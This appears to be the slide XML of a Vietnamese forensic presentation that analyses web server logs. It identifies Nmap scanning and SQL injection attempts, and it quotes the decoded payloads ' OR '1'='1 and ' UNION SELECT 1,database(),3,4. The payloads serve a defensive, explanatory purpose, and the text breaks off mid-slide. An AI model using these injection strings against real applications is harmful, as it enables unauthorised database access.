          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="448" name="Google Shape;448;p41"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2184021" y="2763213"/>
            <a:ext cx="6381721" cy="17267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452"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="453" name="Google Shape;453;p42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="785025" y="1975275"/>
            <a:ext cx="8511300" cy="11211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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>- Dấu vết: </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>grep "Nmap Scripting Engine" access.log</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="355600" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="149955"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150" i="1">
              <a:solidFill>
                <a:srgbClr val="64748B"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="454" name="Google Shape;454;p42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="3773100"/>
            <a:ext cx="10622100" cy="3084900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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Nhận định forensic: Các request này có đặc điểm:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Truy cập nhiều URI bất thường</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Thời gian rất sát nhau</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Nhiều Endpoint không tồn tại</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User-Agent chưa: Nmap Scriptting Engine</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l"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Kết luận sơ bộ: Có dấu hiệu của:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Hoạt động quét dịch vụ web</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Fingerprinting web server</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Reconnaissance tự động</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=&gt; Đây là hành vi phổ biến trước khai thác. </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="455" name="Google Shape;455;p42"/>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6.3.1. Chi tiết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> - Phân tích Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Log (access.log + error.log): </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="456" name="Google Shape;456;p42"/>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57" name="Google Shape;457;p42" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="381003" y="3909450"/>
            <a:ext cx="200025" cy="2638375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="458" name="Google Shape;458;p42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="4400700" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Reconnaissance/Scanning: </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="459" name="Google Shape;459;p42" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="460" name="Google Shape;460;p42"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4908171" y="1975275"/>
            <a:ext cx="6245326" cy="1709325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="461" name="Google Shape;461;p42"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5031950" y="4191600"/>
            <a:ext cx="6800500" cy="22479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465"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="466" name="Google Shape;466;p43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="785025" y="1975275"/>
            <a:ext cx="4167900" cy="11211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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>- Dấu vết: </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Decode URL: ‘OR ‘1’=’1</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="355600" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="149955"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1150" i="1">
              <a:solidFill>
                <a:srgbClr val="64748B"/>
              </a:solidFill>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="467" name="Google Shape;467;p43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800" y="3773100"/>
            <a:ext cx="10622100" cy="2523900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="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Phân tích: Request chứa:</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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Ký tự ‘</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Toán tử OR</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Biểu thức logic luôn đúng: ‘1’1=’1’</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=&gt; Đây là mẫu dữ liệu bất thường đối với trường: id=</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=&gt; Một người dùng bình thường sẽ nhập: QT001 =&gt; Không phải là biểu thức logic SQL.</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-301625" algn="l"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Nhận định: Có dấu hiệu: </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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Thử thao tác bất thường với tham số ứng dụng</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600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>+ Cố tình làm thay đổi điều kiện truy vấn backend</a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468" name="Google Shape;468;p43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="666800"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3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>6.3.1. Chi tiết - Phân tích Web Log (access.log + error.log): </a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="469" name="Google Shape;469;p43"/>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70" name="Google Shape;470;p43" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="99349"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="381003" y="3715863"/>
            <a:ext cx="200025" cy="2638375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="471" name="Google Shape;471;p43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1328775"/>
            <a:ext cx="6096000" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="0" indent="-317500" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Xác định hành vi dò lỗi ứng dụng:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="472" name="Google Shape;472;p43" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="666788" y="1299837"/>
            <a:ext cx="285750" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="473" name="Google Shape;473;p43"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="952538" y="2724150"/>
            <a:ext cx="8601075" cy="7048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477"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="478" name="Google Shape;478;p44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="785025" y="1975275"/>
            <a:ext cx="4167900" cy="11478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SzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>- Dấu vết: </a:t>
            </a:r>
            <a:endParaRPr sz="1150">
              <a:solidFill>
                <a:srgbClr val="34D399"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="020617"/>
              </a:highlight>
              <a:latin typeface="JetBrains Mono"/>
              <a:ea typeface="JetBrains Mono"/>
              <a:cs typeface="JetBrains Mono"/>
              <a:sym typeface="JetBrains Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="020617"/>
                </a:highlight>
                <a:latin typeface="JetBrains Mono"/>
                <a:ea typeface="JetBrains Mono"/>
                <a:cs typeface="JetBrains Mono"/>
                <a:sym typeface="JetBrains Mono"/>
              </a:rPr>
              <a:t>Decode: ' UNION SELECT 1,database(),3,4 -- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
